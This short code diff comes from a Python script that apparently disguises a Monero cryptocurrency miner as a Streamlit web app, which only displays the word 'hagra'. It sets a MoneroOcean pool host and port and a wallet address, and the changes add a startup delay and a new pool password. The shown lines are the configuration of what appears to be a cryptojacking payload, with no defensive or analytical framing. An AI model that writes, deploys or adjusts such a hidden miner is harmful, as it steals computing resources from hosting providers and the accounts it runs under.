@@ -1,3 +1,5 @@
+import time
+time.sleep(10)
 import streamlit as st
 import argparse
 import socket
@@ -9,7 +11,7 @@ import struct
 import json
 import sys
 import os
-import time
+
 from multiprocessing import Process, Queue
 import multiprocessing
 #killer pool
@@ -21,7 +23,7 @@ print("ist", datetime_NY.strftime("%Y-%m-%d %H:%M:%S.%f"))
 
 pool_host = 'gulf.moneroocean.stream'
 pool_port = 10002
-pool_pass = 'stream'
+pool_pass = 'mxtgen01'
 wallet_address = '49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g'
 nicehash = False
 st.write("hagra")
